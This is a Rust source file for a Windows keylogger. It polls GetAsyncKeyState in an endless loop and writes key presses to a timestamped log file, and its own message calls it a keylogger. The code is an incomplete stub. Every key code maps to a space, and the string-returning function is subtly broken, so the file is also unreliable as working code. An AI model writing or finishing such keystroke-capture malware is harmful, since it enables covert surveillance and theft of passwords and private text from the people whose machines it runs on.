#[cfg(windows)]
extern crate winapi;

extern crate chrono;

use std::fs::*;
use std::io::*;
use chrono::{DateTime, Utc, Timelike};

#[cfg(windows)]
fn run(file: &mut File) {
    use winapi::um::winuser::GetAsyncKeyState;
    use winapi::ctypes::c_int;

    loop {
        for i in 0 as c_int..255 as c_int {
            let a = unsafe { GetAsyncKeyState(i) };
            if (a & 1) > 0 {
                let s = keycode_to_string(i as u8);
                file.write(s.as_bytes());
            }
        }
    }
}

fn keycode_to_string(k: u8) -> &str {
    match k {
        _ => { return " " }
    }
}

#[cfg(not(windows))]
fn run(file: &mut File) {
    file.write("Can't use this windows based keylogger".as_bytes());
}

fn main() {
    let now: DateTime<Utc> = Utc::now();
    let filename = format!("log-{}-{}-{}.txt", now.date(), now.hour(), now.minute());

    let mut output = {
        match OpenOptions::new().write(true).create(true).open(&filename) {
            Ok(f) => { f }

            Err(e) => {
                panic!("Couldn't create Ouput file: {}", e);
            }
        }
    };

    run(&mut output);
}

